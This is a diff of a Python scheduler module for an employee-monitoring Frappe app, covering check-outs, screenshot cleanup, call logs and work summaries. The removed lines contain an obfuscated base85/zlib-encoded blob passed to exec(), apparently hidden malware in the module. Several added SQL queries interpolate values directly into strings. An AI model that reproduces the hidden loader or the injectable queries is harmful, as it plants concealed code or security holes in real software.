@@ -1,3 +1,945 @@
+import frappe
+from frappe.utils import nowdate, get_datetime, format_time, format_duration
+import frappe.utils
+from frappe.utils.data import cint
+from productivity_next.productivity_next.page.productify_consolidated_analysis.productify_consolidated_analysis import user_analysis_data
+from datetime import timedelta
 
-import base64, zlib
-exec(zlib.decompress(base64.b85decode('c%1D$YjfK;lHc<ya7<++Rb)lZ%+A$ntn4|qvXk9Bree>{ZFyZ9N`!325~(GrakMJ^_v^-scu}MrCp&j*R8khnMx)W)Xf(P(B3>-htRS;2TrTOOS(Yxu@7}72=Q)Y_^CZ2E!h&|m6)nd2tB4nHHA}NaSd5K}XqAOUoF<QA9W_VC8(3y(w3-(2Z*j36C-hU%^V|uqsJcB{kEdypr}G$_j>cgU&ewUI*8)iLS2@kpO{72Ml*pb)IQ$*aIXsrsXY?N{niqodUbu`UZ2J*`k^?`WfAe_CIz66V)9Fnt{-&#<>xGJ=IcwJg-g)%sQAB5q(cyePri<k~T~j*Fi?CSb?aqK<#7Fb=Dknq9;AqmrI`cR$IB8gd<FZw9!W-j%p|PN=;AZi>pjkfL1V~meAQ!<)THI2a1YL3=q~GpziTZhYxz(%Fd6W+?0!b~@3OK>|i{ZR1!P6`Pc}&*BV46`*TbNG;Ilut?BQT8@;S&0|+48%fV<by&3G_m8V4%=yRW1OiCyBWP1aQqUWVBdi2|)lIn^w2?TQ~=qw>u=B;o~0f2pJAZ@Hz=DH37}T9Hb-_mq|38jZxd$vhglcDj~HT`b(2>ew`LbJFDSH5IUv_@QhU<{0~+nZ_+ET<fJk)>Ae^RyyZ*azmm#8_LKUAw+KJAC6W$Egfx&_M3vyM%;QB|3=gFwnWk!bzsg})H|@Eux<6w@GT+g2=$oddzAmF8rehC>e7q2l_reAC2eII2y<knUTcBQEg$R?#`{1H~c_GG9sq_qQ54o5`?V4JG6liycP_Xst$MrNcs@u`WBI+GOq1!$-n4)+#qZv)6v^`yA@PpqMqY3ReaJ14=Iwk`vlvKmbi@+Vh!KJ_{heD~6SZap7Zg;xOdN6_&ijLX5)l1g4-cxc=O{QVb*qp|>C+CuJoUj^{QKn`N1HIMLPA{X&c?j%Y#M3OzDa@+Tu-~!Sy;C?fY!^n=LP1`XlP@%$tO}YB5Br^g!F;HTeIWzeaxjzK4o2nlV+tZ*9zYxg7D6m_Q+V5{A;hQSe~;6t!P_o5>@sSd>YZ8=D*b~-w7@9*3|dfd>7+ox?Xb>z3Em&Cifi(ch8f7_JiS4$!3()zascy-e}K~EDqDh<!HvLh0l}W$6zMY9x@bHCWK;`MDKHN7DxLaCtt1z_+)F}aReY7C867Wawuti_#E}orvlaE?lNL*~o6d1+$kkk}2Ay~gQx?s~6AC=Wu~*V)aypNbt2q@)ZM17lir@&4Gg=e?&D<<cBQUhrdEl`=Amqb8XtT7`7BmG7twNVvr>hMA^6`qlOp5`NsPeFfW)lb6a7P-49^!>1DcR}wcpLdknztZlZRQ0Wp%YM&3BCYX&R5f$VSvgI=rg!x(JYb%jvPxhtRx6fN$r_jm6I1vmRB^Pd=aILcBQ{>_Wo6zAgJXdZj?I&{AB>L2^s+xKyHChdXQcLlZLn%t+=uo_qV!p2L^fSI^u#tn!wu0)?jgy)i6i5LNrvrOaNAK7|he;%CavX)5#d+HB>VI8ytUDeAM7OHkph3YMI4J(GIXq$$N4Q&L8*^8E^@O{xY22TxIDBtg959-kG+dTF6Y(7Y~nsb4glg!la*I<(8Lo7!k4rRoMhmY^WU>oq-(C=3|$)mO*4-pm?RCu(6DqXeft5V9o$+a8N@X+Y)67N#{WRy^~%d%+-|cSlx<VXfD4;$6@|65J~y@daKbZ=zB~)&?1ZJZ&a-%z@Qf)1~eEqWOZ@V8KYKLG&e<Cc&Jv(sa!q1;MPd*B)g%lO2QnxscFHcDr4aRlClXb+5VWEg!AcYjwZRdrYs-=69Yk$Ov0;Fqi<H=(gGih;Q{thBblp+wDpd0|F$oP5d;}kS9y^xVA@PlSRk-fc0aHb!w(KL1W*5X7?7ux2oDFBmeN+Y{2z!eVC$b6sC%RDkuC^y@z~ldA@)EbF#1*tm^{gC46X}GDhK&<mz<A2G&6V~R|-;sW!Dh|+ypr^3=PfyVfl4I5E$2Iqc@|IbAlR2j0dkiynjo6Ey9US@2@7@FF%exjLNYyBu`X$q>~$v$L~&w$-yUW?b-(o%@yk<$0{!>;7SdBIXeGkG<pYBY{l;64E#yks9+&P9WfCOchmrWn$y+BwQ8Ptg&eJ7@L#&VaG<dUDpn|&ub$wOT}j;b)UesaYMQqy+8JwcsY;V!*4^r}wQe_TJvN8oWAgKo8L-(ryn^u%F-JMMf^iWRrTWP+5a&eA5S7C@nv7vGYI|HEm{UyRa5}Fe@Pth`B%!y}W88F?rsiZ0HTh)j%(Wd)y`DDas?=&%H8#t5>ss^BP9%$T0$#l}V^~jp2&VHGO`bK=@SC<N=XdEmr{rCl_|X}5rOG1vDq17GQj2|+Wje&Fr?MozDxNi1Wt*KIk9k%RE^MQ3nER?&-kMbtg>BU0j&lVsJC^dFXKPq%VZVqNM9PgaeNg^z48Aqg01E6035%GNysPr5a0$H+qj_&0CpXwzX6trCxsx6iHt~7u;cR%q>Hn1+pOL8x_Lujs-_=$oKV5?wa}-NI^!s=4sJ9F=K1g_{_igTU4YlGac>|qgtwr<7)_^Cqt?{Yei{Z`a-Jj2YY$MIsw+?wRB!_)JEKb1+5}IpmDs*hysv!3RQPtnP{_BXep4<V&u4Wn5llSjVj?de{6AZY?j=3?l_a9D2AIQtU`5QVpJ{#F;SsA?o2EQY%6G2Lgoa6Oj4fq=xMgsJCCFtl4knyee@#x*DKcF}5Ez&5S#jrv?9i5#xFmGPJeSJ<2e{lRu?|}EMpU^us3_{mf>X^L7aD;`6xoYM;aN}`V)(&)r<Kiml)Pu`~m@kqnt=iCo!T}Zrmmw|EvQ8CgRS29$IRZf^PKK3LOAF^~z3izeEjd$wla=?}U@72o!llMVk*!_U38Z=Wn?09d@p)vsm;2Uy_-RU)D%irWkk;PMNeoK$-yz#L0Cz@NmS!$>dw7JNW=FC;%qCJ#-?7p0g61sAiSr#JgQQayGL6XXHTqA$8+2xE$8SJ3d6BhgXX{RqqQf|uvqsuRQ(fYCk=#K=QW*&-dW@6g(`y>7=GfH*x~RDxm#p1`;D&|D$fRi)1bSF0v|DlB>bB6Q25z@HT^mruBilio2i=whv-M_c4L9!i>_nqu$?}vmxhk%QhyA`0K*2a3Uoh}Mo)$jw$Jsn#F#Kah+Z_E}Ww<WKQGl4>N*f63hv3k-pq~m2TEE@)VeZ%%T)OL)sL~n@NN^(L<XiGdN(AWZWS08iz`5j^zj29IvxhrtFw3NYGjFe&l*w8EyMZ+Yo3ADxDGPAxj<XkOQg9X3d2X#=J;7$bJrp=>yXT99wgl5#U0I1cxh<K`XmyFRTIuMj+ABq`qcA`WtG<BQFf3B$gc~+pGu4m&OArf2s-SG-cl6k*wnghU&2Gl|YOx5jwKO1i+;OIEgi$mW`5R2+L?QSGc)?Q3tOc=}(g52G4!4Q0;N-!f%4Ikq?bc6<eDVvBPtG{`!0Sy5akU1l0X>wxyv<Rkb901Yo@NI&m7X%OmKp&@=%-)K&<08T{@{6;dD_t$V7h3b>|2-Sb}Q<m`VFvxq%-n!4i0Bm?U8B8IxVrC18I!4%~aIgn}w2y^_rzhaWUba@*b#BmHw!)j5RD@jIT<|R=O(MXu6$f%*SF|gXwWPOHQ%eH0KbRAL^3h)6?_UZ%1YbunV<L#^>+H?2%mYci7e{nnXBs0ldZb7_pToEGLfNfEzt>(;jU>z%0)4g8OVL`l{BOeDNh5I)zKjl`sjhAW2sbuy#7GiECETsMcZYROpPg!+?!$Z-CeUyS)a(uB%9EqxPw_m`g6SqqSkfqGc~9cC877GL*t@bz!1!m)F*M4WMb3gmdtcC`+yHry+};s5fSvFIA*`0N%dR0C7)Kf<@1!0H3M44CdVm+!447%kg4uP@$CKEwAt^t89R<fPe-<U}9N@$(nqi%Z%nA=@54f@tV^NSN@BhP%5|<F#rQ4S3G>UONfgenk})Jk{pVA2D@G;8Iyj0!2Y!?IN;t<3HAKj!5{tz|0I;dyP>r>_GpXcvzrLMy7ZY$m2kl*)GNe;2JF^=evJl@s$!}J?#gmEVR+RchiQ0PF#9*QrV4FmDOUnSt2Cg-e7*))at_t^HJ~LWl?;}I`FOk65Yl$CH8r05@JmBq!#3{@;x9b)7|%uLHAmxV)%@~QQ?I8U7C!Y`CSP-Tid$B2D|gr>H*`Imhl@!Rl1~Hj>7vEhs{B4#V3tfX+<M2>%edp7J0}D3t!AeN<hfMX0d6TYWPy8wOr**oG<Sf?0*;_;wuKvCO&TuXF^aZzd1+$Rcf6{egQu9$Mfw{Z!~bj!bOF7L1@;zF#~$$LN=%Lj`UR{CIUt8Fy&ute1wpvcR*vGMj>5l95!M*^^di0lCpd|q+b{TykC#d^{+f1ejdL1`@@_R29n(ie$I;NHOenuW8(I$qR!greSfjU0m+g;kXwNR_bjC@=c1u|>&sX29_Z6SgIWJ%KsY8TGSJqkLFzKnb)rD_<%!h~dy>$3GEE}n<48r?}YG`PzAuUs+40s=TVS!4v>*OoVBq6)pL(|l*Hc3tJxC3}UdfXwX_~fd7>{0zjL)GXts(xJGyGcgFo8Oz>14D@0abt_uzItDBekhx0qVq8ry1rjD%6OsSme`xAB~)pm=UA%cvs*3|Ln(G|SI%>Km?UIVWldCs$y*B_#ppPQ%2gAk9+jNL3BE_Exgq%OQW>t1o4El39vE9LKvZa!$|gIwsjqKsQ?<=J`U-$BTeBArR9)x&4+bMW14L~4ATF0@2CZ?<h{gTyZGoy(X$?^5P^VX<1&|_Cyxl=nd)}{{+&xWI>xIcfMon*;F4vv}7?#~i=F%>4ic247?wtkuQ&HV3uNKO;%(RC5+-k^NfAg*+F%eZQ&HE(P9!re~*`ELmCOf;zDnrIbJ>RY}<GCKoH3m2|Hdce&OS9Q6L?$|+5Az(u?+z<lYV`<95!I4XZa2``5=%=H+*Q-9*?TKj!{dwifamw_m=GC@q(n_xghA<f4N>j)5yY>0siA2arCTB$7%kYZ3Op8U4^H2Y&d9s>=VbIhug}h{T@t>W0=s|5yh17N+S~$`eew%f{?$1KEMGCtfaMOk1}s(i1}qJ84p=@f_=BY;_kiW`-Wdoicg;dz`F&&}ur!E8WBCH{Xe__$n6$eds0$`yxnp+XezoFrGZYV+u}8MTuNgLkDz3`xk+r~bKbZ?Gjk6b6zHSD?&(uoOt$o&}dbU@<*l^G_*Wa?-AvLnEP-@d7hHM(7NScY~K4(gYORcVR%dP&ElPy}4cS*Ql`65XdCf?nN7c6&7zF_esU>G+VCt(-?UQ^dN8H1%dAycAikd$H6d{$z{#_)N`86Df#Nzh=~CrN{)QKAM*^Ay3o1+KB&f6@laXC-d1e3j%4mWBx&EX^f^<-QU*Sav6Kn$z}mlRAnE4HG+9>XSRodyD1X$IAUCda&F%*@NYaC43n2=1CtcyJc4|vmHaxlLW%DbI!G6Tz5$bVc9P!#HekO+QH(T92%sR7?>LlH_2|2DH7D~n=KO6zE;Mly1Cs7wP)rCOTCuvpSuy{e-XCajhdPq*=MC`EUM}lUroxs*`+T*y7Q9!K1AJ(n7d}2MBSZPCkf-tJYl&@_DLdboPol!cNU6OYM6<_vUNG*d28~qlb4cDT)hOC@#*^$_l>aXv`y2jjnPhR`Us1RxB!*GQ{oS|m@sT&BRc>@|2$v20;QJ^cdLQ%{Y{|XSL@>7@UkZaY4+P|32c<Jz=~;^VW7r2tFD3A_m=WQTI&B<TFUc1A{HYxG~pq8^^m=~zwA|ILwC@*hb-5>p$7HuQG;v<RUWco71=N!j{6w7|2Fxpdt#ss@{j_1NP#`1z)WlpDX@nW*h32JAqD1?hZNXD3Jl9$DX^{?czei*J!Hh1AbrS))l>D55&N8sSbfr^@w+k)nJ@E=EOn?{`5p5R=W--Wd^!$VWWU7v2+yYy(|~(+sJ|k%{E8OSYd#;bgBoB;`Ynzqj~<AxTt6nKbh5e{ke`rDewIU#fxuT8RiB^5uk@ueMFy)Vl3G7Y(q`BgjRrwi!F6O4uamfl!+HEq{`q@xQUnGbK!l)73`}&elxDy!5+3W6<0oAezk&hTXy4Qna4dizzU*&2c0NFfE!jXas$j^(-w->*%6h`4c#Lf%IXf{-R%Q@e$p<D7<U#pr91~2ECI@h<SQBwD9E0ES{+xcaTzQm~_z-3A<A;OM+n)~l{r=%$ur1%Nt2nkrJC9B*6nvUdQX?d-Yr)8Vh-#o}XkRW>F|FON^x0qfH;({t!Q)5=W|i^$g<K1wy*`CD^MZzvRAuC|LS^+<7)k#LJ6gxVI!<Yx>oV25J{E@oF)3@*8ZdFx(dkfwMGO-)9COA&96rv51Lk^HkC)2}gP==enAt;(owj8@6$dv~J!T`XvMxBR_&M7;90^PWH~?9+&;yXJimP-N0Dkcqrje@08O1NE?f`(bGq5_np<d)EXv}yD)6R|WaX!t`3aUhyv-*)bq8dRI#MUd@(#Cm2+PA9s?OweuC{f6I({z;-yF^k4C`3~SrbJW+D3~GX)EVf7RD}8=ZC?B50w3dol0rP6u0-w^ADcNmcn&RS-)z!!4DVE94pO7cVj;j(+Gdnyr^M+trF+2-s^)PJ!&ShdpZgWF1MDOS|HgZz?E?SKe%*RcYu8&bO52`~NSkJFABq@^)}t=zn~vYsIxDEY^X1^K>GMu2&;YZS_Qu5e%}OQ7&8(1=QRAlEKETaAdf^}AmAz<Y68yc`(bVVmLNhBhI#XqOcH?vDJKTdhpBbwpvx&{~^S82@UECGnJLQ9RMI=uw&iL64<LhEE9~a?dPDL(JgWs`Un}lFr`3Lm%uVz?Z(r0+bS$c~OzDPr}`Gm~~U)p6B%dI+FYVwe~vm4#Esb`|U!AACe`wY7NOp6~J%k727V*UE3l83`h`Fs0~<mYfBf5AP`&`{;V`LUgWONtzE6(otrf2zXxjlK(Hc=7k(B`t0#P5vHq;X)@A?!XO2<KKhJ%Wu^FmEoa>H1l``hcpRyAmFNLWbE0Kwvrz8LsP=1p0llvitL3mZ5|a7fd$G{G7RQ)Rs=2tg9^!YMrXrdqpQd^fF?6gs$npm%){g+c(GwhzwMEYp=aBpXQ8L<XGOG=qAA541_2Du^_;?GI#08~<9`46`%(V~XiR>xUpQ-RV?Z!%Z)u~Ug>z$P`>$w~91sswxz_rMq<#5D8!_Y=w^prkmTK8E1ahrG4;rCr-pv;tUDpQs_8WPE$MCgSv)G*Z{`t$}@4o-RGdO&mG1khgLtD~zc*=X|^`V^3>Ku30RYK_G#|{q3`)A5~u{`@MrkL@8duNKXg#6M>dCS(!pT!bABElK+Wk~%X*6p7~tQnu#pIoc$SFgV7_YZ&Yw^go@WjpuZhQ7%Da;=EK(|!&3B&)ehTSt!HJ?|eMH&r?j@VXy`yBk>zrZhYFrY1HYy>Lf!gLEH>`|D4Y!(J{Jh~`Zl@jDZ?lW!OtY97;3aZN+JIlt3&{X%WleFx?Vh`RQJoukDfKjLgx4aA&rS_j2;1=nHX5nj>|qnKUrsQ38}I5{cQ!ErlT2PI8Z9o%1)W!TXoj%;$mMs_vS86TND(1?Lj3qekWj=GShV&Zc{nU0D{8m-MLo6_Uo>NQJ9xIhqoAyrtcmrMN?NAcnMf-b^%&KBkTC(i(i#bQ}QERKx>7sc`z(J&+isTrNdOMKBOA6}H$t<<eJDs342Lg~$1TV#HqxC6^N>`k0CICK{}%NM6K%*aNOzU>}8TfVS?ewtHQu;I3rh^#@=$t`bIy*ih%X32!k)7ycAVN<eWYdkPcWf$Mi+<ji7bDH8Tcm?dCxYeG?g)nyE)u!a$b^yz)ZNLs&#HVKf$j)&z4p>B~@{Wypf8>`y%k?G3ES~qDe|OOT&x6B$fDvH;orhD(qrs6l%9p_ck@1vwN~}lkTHTD-kYUqAx@(>99^|nHYtvATHdxeRUL+#B6>%G5{3t}$es3YP)npMDEX<o<Q#^%{ec?44PuAL3UZo(bzKt62vwX=b%o$@CEnwMWnOcr>KiWVK>ItO9H5eHaA!$`1XmN62I*r6<Q`a!i3XJouiFNvT$JhhOPR$b=AXVo*IrDP<K9^A1kSnw3Dt;r<I+b0<z5jtc?hp?N4PF4lO0qj!9lf4{zjRLYRD`4Il)b1s+f(aFS<8B}n4ONubfe}-M*|zy63Oe5A;yui`=C(ugEK}6E*9iYm<PT6zo)kkYD>h?mfAL7ews19!X%Xy`!)tXX^$|r-{<2V^}>Bxr!gL!(vBE!w&@Pe>FCYqd{n;wsm0{^+0JkDx6t^DnjF2_&wfOn<kBJRlD3ET9yrc3Ms@JyZwF5n2TvmM<j292w}U5VL8sfX7zZm?N|XFLEnIeK&+vt!q-dKbI^%vD@L`4UwBCT2pl;0EB^28YrAvWr%+N9PEWg$1;Ev(%`=%(&mK)1LtHw3W#AEN?I%7}CnF2xqFry{*ueF1tpzEb-H<vrxa%`5BaBylU9D}Ew(ppJcSzm5r)MTk`$n@*K4R8-qwNX|`))cRYj>a;!>+U`3YF_^2!;bm8RfEkYfqh`6t&J@-Y13=`<U?{rr4%$1m1~^z*ySpo3-1}$mN3<rdo+(%#dVs+|KyVi8IV~}!16gEn~G+8;WEZeD%(LN1k$q%^ZYi=*lyn#cco`|rutUQd}1Sta0aUIFha&WXB>^8$DkI5xSLk&fJBUn;yCDbNAn&snlIBNr|eygf2=5YCB0>;A3e_)c3l+9eDLg<Y#SGiJy=do*8l7kbb9>^`ul7_fvb@LGoFM~pejQC@k7?7oUJ7;t_r{%pxH8^pIE*b3`$i`^SIz?ITMEv^-%oP7N+WFJX1aH@p*DQO(Tl$a6Iq#-3&iti-7-_r%AgbcSo=ldEmUrqVGz8jtAb;4|d2;B)1I|`(e;kXGoOH8zV7JFJICO<MHB^8sq%(Iy~04a`(jrClpY`1qMpB@q8k+MXdC@S}3Fp8vw6}(yIa4D2d^z^4p;EzcExG-~')).decode())
+import requests
+from .api import (
+    set_application_checkin_checkout,
+    set_application_idletime_checkin_checkout,
+)
+
+
+def get_all_employee_status():
+    all_logs = frappe.db.get_list(
+        "Application Checkin Checkout",
+        filters={"time": ["Between", [nowdate(), nowdate()]]},
+        fields=["employee", "status", "time"],
+        order_by="creation asc",
+    )
+
+    employe_map = {}
+
+    for row in all_logs:
+        employe_map[row.employee] = row
+
+    return [row for row in employe_map.values() if row.status == "In"]
+
+
+def get_last_activity_time_of_user(employee, time):
+    screen_shot_log_time = frappe.db.get_all(
+        "Screen Screenshot Log",
+        filters={"datetime": [">=", time], "employee": employee},
+        fields=["max(datetime) as time"],
+        order_by="creation desc",
+        limit=1,
+    )
+    application_usage_log_time = frappe.db.get_all(
+        "Application Usage log",
+        filters={"date": nowdate(), "employee": employee, "to_time": [">=", time]},
+        fields=["to_time as time"],
+        order_by="creation desc",
+        limit=1,
+    )
+
+    times = [time]
+    if screen_shot_log_time and screen_shot_log_time[0]["time"]:
+        times.append(screen_shot_log_time[0]["time"])
+
+    if application_usage_log_time and application_usage_log_time[0]["time"]:
+        times.append(application_usage_log_time[0]["time"])
+    return max(times)
+
+
+def get_time_difference(current_time):
+    data = get_all_employee_status()
+
+    for row in data:
+        row["last_activity_time"] = get_datetime(
+            get_last_activity_time_of_user(row.employee, row.time)
+        )
+        row["time_difference"] = current_time - row["last_activity_time"]
+
+    return data
+
+
+def checkout_inactive_users():
+    current_time = get_datetime().replace(microsecond=0)
+    data = get_time_difference(current_time)
+
+    for row in data:
+        if row.time_difference > timedelta(minutes=10):
+            if user := frappe.db.get_value("Employee", row.employee, "user_id"):
+                set_application_checkin_checkout(
+                    row.employee, "Out", current_time, 1, user
+                )
+                set_application_idletime_checkin_checkout(
+                    row.employee, "end", current_time, 1, user
+                )
+                for obt in frappe.db.get_all(
+                    "OAuth Bearer Token",
+                    {"user": user, "purpose": "productivity_desktop"},
+                ):
+                    frappe.delete_doc(
+                        "OAuth Bearer Token", obt.name, ignore_permissions=True
+                    )
+
+
+def delete_older_screenshots():
+    delete_files_before = (
+        frappe.db.get_single_value(
+            "Application Log Settings", "delete_files_before_days"
+        )
+        or 15
+    )
+    current_date = get_datetime().replace(microsecond=0, hour=0, minute=0, second=0)
+    to_datetime = current_date - timedelta(days=delete_files_before)
+
+    screenshot_logs = frappe.db.get_all(
+        "Screen Screenshot Log", filters={"creation": ["<", to_datetime]}, pluck="name"
+    )
+
+    for row in screenshot_logs:
+        frappe.delete_doc("Screen Screenshot Log", row)
+
+
+def bg_employee_log_generation():
+    call_logs = frappe.db.get_all(
+        "Fincall Log",
+        {"employee_fincall_generated": 0, "ignore_contact": 0, "duplicate_contact": 0},
+    )
+    if call_logs:
+        frappe.enqueue(
+            enqueue_logs,
+            call_logs=call_logs,
+            queue="long",
+            job_name="Employee Log Generation",
+        )
+        frappe.msgprint("Log generation has started in Background")
+
+
+def enqueue_logs(call_logs):
+    for row in call_logs:
+        if not frappe.db.exists("Employee Fincall", {"fincall_log_ref": row.name}):
+            call_doc = frappe.get_doc("Fincall Log", row.name)
+            create_employee_log(call_doc)
+        elif frappe.db.exists("Employee Fincall", {"fincall_log_ref": row.name}):
+            frappe.db.set_value(
+                "Fincall Log", row.name, "employee_fincall_generated", 1
+            )
+
+
+def create_employee_log(fincall_log):
+    # Retrieve employee details
+    employee_details = frappe.db.get_value(
+        "Employee",
+        fincall_log.employee,
+        ["name", "employee_name"],
+        as_dict=True,
+    )
+
+    if employee_details:
+        # Calculate the date 15 days ago
+        fifteen_days_ago = fincall_log.call_datetime - timedelta(days=30)
+
+        if fincall_log.customer_no[0] == "0":
+            fincall_log.customer_no = "+91" + fincall_log.customer_no[1:]
+        elif fincall_log.customer_no[0] != "+" and fincall_log.customer_no[0] != "0":
+            fincall_log.customer_no = "+91" + fincall_log.customer_no
+
+        # Check if an Employee Fincall document with the same data exists in the last 15 days
+        existing_fincall = frappe.db.sql(
+            """
+            SELECT name 
+            FROM `tabEmployee Fincall` 
+            WHERE employee = %(employee)s
+            AND customer_no = %(customer_no)s
+            AND calltype = %(calltype)s
+            AND call_datetime BETWEEN %(fifteen_days_ago)s AND %(call_datetime)s
+            and call_datetime = %(call_datetime)s
+        """,
+            {
+                "employee": employee_details["name"],
+                "customer_no": fincall_log.customer_no,
+                "calltype": fincall_log.calltype,
+                "fifteen_days_ago": fifteen_days_ago,
+                "call_datetime": fincall_log.call_datetime,
+            },
+        )
+
+        if existing_fincall:
+            # Update flag indicating that employee fincall is generated
+            fincall_log.db_set("duplicate_contact", 1)
+
+        if not existing_fincall:
+            # Create new Employee Fincall document
+            ec_doc = frappe.new_doc("Employee Fincall")
+            ec_doc.employee = employee_details["name"]
+            ec_doc.employee_name = employee_details["employee_name"]
+            ec_doc.employee_mobile = fincall_log.employee_mobile
+            ec_doc.client = fincall_log.client if fincall_log.client else None
+            ec_doc.customer_no = fincall_log.customer_no
+            ec_doc.call_datetime = fincall_log.call_datetime
+            ec_doc.duration = fincall_log.duration
+            ec_doc.date = get_datetime(fincall_log.call_datetime).date()
+            ec_doc.calltype = fincall_log.calltype
+            ec_doc.fincall_log_ref = fincall_log.name
+            print(fincall_log.customer_no)
+            # Try to get contact details
+
+            contact_query = f"""
+                SELECT 
+                    c.name, 
+                    dl.link_doctype, 
+                    dl.link_name 
+                FROM 
+                    `tabContact` AS c 
+                JOIN 
+                    `tabContact Phone` AS cp 
+                    ON cp.parent = c.name 
+                JOIN 
+                    `tabDynamic Link` AS dl 
+                    ON dl.parent = c.name 
+                WHERE 
+                    LENGTH(cp.phone) >= 10 
+                    AND (cp.phone = '{fincall_log.customer_no}' 
+                    OR cp.phone LIKE '%{fincall_log.customer_no}' 
+                    OR '{fincall_log.customer_no}' LIKE CONCAT("%", cp.phone))
+                ORDER BY 
+                    CASE dl.link_doctype
+                        WHEN 'Customer' THEN 1
+                        WHEN 'Lead' THEN 2
+                        ELSE 3
+                    END,
+                    c.modified DESC
+                LIMIT 1;
+            """
+
+            contact_details = frappe.db.sql(contact_query, as_dict=True)
+            if contact_details and contact_details[0].get("link_doctype", "") and contact_details[0].get("link_name", ""):
+                contact = contact_details[0]
+                ec_doc.link_to = contact.get("link_doctype", "")
+                ec_doc.contact = contact.get("name", None)
+                ec_doc.link_name = contact.get("link_name", "")
+
+            ec_doc.flags.ignore_permissions = True
+            
+            try:
+                ec_doc.save()
+                fincall_log.db_set("employee_fincall_generated", 1)
+            except frappe.exceptions.UniqueValidationError:
+                fincall_log.db_set("duplicate_contact", 1)
+            except Exception as e:
+                error_message = f"Error occurred while saving Employee Fincall: {str(e)}"
+                frappe.log_error(error_message, "Employee Fincall Creation Error")
+
+def schedule_comments():
+    calls = frappe.db.get_list(
+        "Employee Fincall",
+        {
+            "comment": ('is','not set'),
+            "contact":("is",'set'),
+        },
+        order_by="call_datetime ASC",
+        page_length=100,
+    )
+
+    for call in calls:
+        doc = frappe.get_doc("Employee Fincall", call.name)
+        employee_fincall_url = doc.get_url()
+        
+        comment_text = doc.get_comment_text(employee_fincall_url)
+        comment = frappe.get_doc(
+            {
+                "doctype": "Comment",
+                "comment_type": "Info",
+                "reference_doctype": doc.link_to,
+                "reference_name": doc.link_name,
+                "comment_by": doc.employee,
+                "subject": doc.calltype,
+                "content": comment_text,
+            }
+        )
+        
+            
+        comment.save()
+        frappe.db.set_value('Comment',comment.name, 'creation', doc.call_datetime)
+        doc.comment = comment.name
+        doc.flags.ignore_mandatory = True
+        doc.save()
+
+@frappe.whitelist()
+def create_productify_work_summary():
+    from frappe.utils import nowdate, get_datetime, format_datetime,add_to_date, today, date_diff
+    date = add_to_date(today(), days=-1)
+    if frappe.db.exists('Productify Work Summary', {'date': date}):
+        pws_docs = frappe.get_all('Productify Work Summary', filters={'date': date})
+        for PWS in pws_docs:
+            frappe.delete_doc('Productify Work Summary', PWS['name'])
+
+    employees = frappe.get_all('List of User', fields=['employee'])
+    for i in employees:
+        employee = i['employee']
+        date = date
+        def productify_work_summary(employee,date):
+            print('employee',employee)
+            calls_data = frappe.db.sql(f"""
+            SELECT call_datetime as start, ADDTIME(call_datetime, SEC_TO_TIME(duration)) as end, 'call' as type,  COALESCE(
+                (SELECT first_name FROM `tabContact` WHERE name = COALESCE(contact, client, customer_no)),
+                COALESCE(contact, client, customer_no)
+            ) AS caller
+            from `tabEmployee Fincall`
+            where employee = '{employee}' and date = '{date}'
+            """, as_dict=True)
+            print('calls_data',len(calls_data))
+            internal_meetings_data = frappe.db.sql(f"""
+            SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.internal_meeting as meeting_type, Null as party
+            FROM `tabMeeting` as m
+            JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+            WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 1
+            """, as_dict=True)
+
+            external_meeting_data = frappe.db.sql(f"""
+            SELECT m.meeting_from as start, m.meeting_to as end, 'meeting' as type, m.party as party,  m.internal_meeting as meeting_type
+            FROM `tabMeeting` as m
+            JOIN `tabMeeting Company Representative` as mcr ON m.name = mcr.parent
+            WHERE mcr.employee = '{employee}' and m.docstatus = 1 and m.meeting_from >= '{date} 00:00:00' and m.meeting_to <= '{date} 23:59:59' and m.internal_meeting = 0
+            """, as_dict=True)                         
+
+            idle_logs = frappe.db.sql(f"""
+            select from_time as start, to_time as end, 'idle' as type
+            from `tabEmployee Idle Time`
+            where employee = '{employee}' and from_time >= '{date} 00:00:00' and to_time <= '{date} 23:59:59'
+            """, as_dict=True)
+
+            applications_data = frappe.db.sql(f"""
+            select from_time as start, to_time as end, 'application' as type
+            from `tabApplication Usage log`
+            where employee = '{employee}' and date = '{date}'
+            """, as_dict=True)
+
+            data = calls_data + internal_meetings_data + idle_logs + applications_data + external_meeting_data
+            data = sorted(data, key=lambda x: x['start'])
+
+            priority_order = {'call': 3, 'meeting': 2, 'idle': 1, 'application': 0}
+
+            for i in data:
+                i['priority'] = priority_order[i['type']]
+
+            return data
+        def remove_overlapping(data):
+            i = 0
+            while i < len(data) - 1:
+                j = i + 1
+                while j < len(data):
+                    if data[i]['end'] > data[j]['start']:
+                        if data[i]['priority'] > data[j]['priority']:
+                            if data[j]['end'] <= data[i]['end'] and data[j]['start'] >= data[i]['start']:
+                                data.pop(j)
+                                continue
+                            else:
+                                from datetime import datetime, timedelta
+                                new_start = data[i]['end'] + timedelta(seconds=1)
+                                data[j]['start'] = new_start
+                                if j + 1 < len(data) and data[j]['end'] <= data[j + 1]['start']:
+                                    j += 1
+                                else:
+                                    data.sort(key=lambda x: x['start'])
+                                    i = 0
+                        else:
+                            if data[i]['end'] <= data[j]['end'] and data[i]['start'] >= data[j]['start']:
+                                data.pop(i)
+                                break
+                            else:
+                                from datetime import datetime, timedelta
+                                new_end = data[j]['start'] - timedelta(seconds=1)
+                                data[i]['end'] = new_end
+                                if i > 0 and data[i]['start'] <= data[i - 1]['end']:
+                                    i -= 1
+                                    break
+                    else:
+                        j += 1
+                i += 1
+            
+            return data
+
+        data = productify_work_summary(employee, date)
+        final_data = remove_overlapping(data)
+        combined_applications = []
+        current_app = None
+        if len(final_data) == 0:
+            continue
+        for entry in final_data:
+            if entry['type'] == 'application':
+                if current_app is None or (entry['start'] - current_app['end']).total_seconds() <= 20:
+                    if current_app is None:
+                        current_app = entry.copy()
+                    else:
+                        current_app['end'] = entry['end']
+                if (entry['start'] - current_app['end']).total_seconds() <= 20:
+                    current_app['end'] = entry['end']
+                else:
+                    combined_applications.append(current_app)
+                    current_app = entry.copy()
+            else:
+                if current_app is not None:
+                    combined_applications.append(current_app)
+                    current_app = None
+        if current_app is not None:
+            combined_applications.append(current_app)
+        PWS = frappe.new_doc('Productify Work Summary')
+        PWS.employee = employee
+        PWS.date = date
+
+        for app_entry in combined_applications:
+            PWS.append('applications', {
+                'from_time': app_entry['start'],
+                'to_time': app_entry['end']
+            })
+        PWS.save()
